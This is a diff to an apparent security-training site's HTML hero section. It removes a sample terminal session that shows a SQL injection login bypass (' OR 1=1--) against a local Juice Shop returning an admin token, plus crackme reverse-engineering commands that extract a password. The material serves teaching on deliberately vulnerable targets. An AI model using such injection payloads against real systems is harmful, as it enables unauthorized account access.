@@ -40,25 +40,7 @@
   <!-- Real output, trimmed to fit, from this repo's own crackmes and a local Juice Shop. Nothing here is mocked up. -->
   <div class="hero-bg" aria-hidden="true" inert>
     <div class="session-wrap">
-<pre class="session"><span class="c">$ nmap -sV -p 3000 127.0.0.1</span>
-3000/tcp open  ppp?                      <span class="g"># the dojo's only target</span>
-
-<span class="c">$ curl -s localhost:3000/rest/user/login \
-    -d '{"email":"&#39; OR 1=1--","password":"x"}'</span>
-{"authentication":{"umail":"<span class="g">admin@juice-sh.op</span>",
-  "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."}}
-
-<span class="c">$ curl -s localhost:3000/ftp/acquisitions.md | head -1</span>
-<span class="g"># Acquisition of the ...</span>   confidential, world-readable
-
-<span class="c">$ otool -tv re/bin/crackme2 | grep eor</span>
-eor    w8, w8, #0x5a                     <span class="g"># the "obfuscation"</span>
-
-<span class="c">$ lldb re/bin/crackme1 -o 'b strcmp' -o run -o 'register read x1'</span>
-  x1 = 0x10000059d  <span class="g">"hunter2"</span>          the password, straight out of memory
-
-<span class="c">$ python3 -I bench/bench.py</span>
-Total: <span class="g">19/19 solved</span></pre>
+<pre class="session" id="sesh"></pre>
     </div>
   </div>
   <div class="wrap center hero-copy">
